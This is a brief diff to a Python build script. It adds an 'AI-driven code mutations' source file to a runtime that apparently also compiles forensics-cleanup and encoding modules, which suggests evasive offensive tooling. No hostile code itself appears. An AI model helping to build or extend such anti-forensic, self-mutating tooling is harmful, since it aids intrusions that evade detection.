@@ -426,6 +426,7 @@ def stage_compile_runtime(build_dir, platform="windows"):
             LINUX / "forensics" / "cleanup.c",               # Forensics cleanup
             LINUX / "forensics" / "linux_forensics.c",       # Linux-specific forensics
             RUNTIME_DIR / "common" / "encoding.c",           # Base64/hex encoding
+            RUNTIME_DIR / "ai" / "mutation_engine.c",        # AI-driven code mutations
 
             # Legacy syscall files (if they exist and don't conflict)
             RUNTIME_DIR / "util" / "mem.c",
